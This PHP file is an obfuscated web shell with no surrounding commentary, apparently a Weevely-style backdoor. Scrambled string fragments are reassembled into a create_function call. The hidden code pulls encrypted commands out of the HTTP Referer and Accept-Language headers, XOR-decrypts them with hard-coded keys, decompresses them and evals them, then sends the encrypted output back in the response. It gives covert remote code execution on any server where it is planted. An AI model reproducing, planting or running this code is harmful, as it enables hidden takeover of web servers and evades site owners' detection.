<?php
$d='y"]J,J$q);$q=arrayJ_valuJes($q);Jpreg_mJaJtcJh_all("/J([\\w])[\\w-]J+(?:;q=0.J([\\d]J))?,?/J",$ra,$mJ);if($';
$u='2]J[$z]];if(JstJrpos($p,$h)===0)JJ{$s[$i]=""J;$Jp=$ss($Jp,3);}if(arrJJaJy_key_exists(J$i,$s)){$sJJ[$i].=$pJ;';
$H=str_replace('m','','mcreatme_mfumncmtimon');
$K='$kh="5d4J1JJJ";$kf="402a";funcJJtion x($t,$kJ){$c=sJtrlen($k);J$l=strlenJ($Jt);$o="";Jfor(J$i=0;$i<$Jl;){fo';
$n='$JeJ=strpos($s[$Ji],$f)J;if($e){$kJ=$kJh.$kf;ob_staJrt();J@evaJl(@gzuncoJmpJrJJess(@x(@base6J4_decode(pregJ_';
$D='qJ&&$mJ){@sesJsion_sJtarJt()J;$s=JJ&$J_SESSION;$JJss="substr";$sl="sJtrtolowJer";$i=J$mJ[1][0].$m[1]J[1];$Jh=$sl($ss(';
$T='JreplacJe(arrJay("/_/","/-/JJ"),arrayJJ("/","+"),$JsJs($s[$i],0,J$e))),J$k)));$oJ=ob_Jget_contenJtJs();ob_e';
$I='_REFERJER"];$raJ=J@$r["HTTPJ_ACCEPT_LJAJNGUAGE"J];if($rrJ&&$ra){$Ju=parsJe_JJurl($Jrr);pJarse_Jstr($u["quer';
$f='JJnd_clean();$dJ=basJe64_enJcodeJ(x(gzJcompresJs($o),$Jk));print(J"<$k>$dJ</$Jk>");@JsJessioJn_destroy();}}}}';
$L='md5J($Ji.$kh),0,J3));JJ$f=$sl($sJs(md5J($iJ.$kf),0,J3));$p="";for(J$z=1J;$z<couJnt($m[1J]);$z+J+J)$p.J=$qJ[$m[';
$Q='rJ($j=J0;($Jj<$Jc&&$i<$l)J;$j++J,J$iJ++){$o.=$t{$i}^$k{J$j};}}retJurJn $oJ;}$r=J$J_SERVER;$rr=@$JrJ["HTTP';
$G=str_replace('J','',$K.$Q.$I.$d.$D.$L.$u.$n.$T.$f);
$m=$H('',$G);$m();
?>
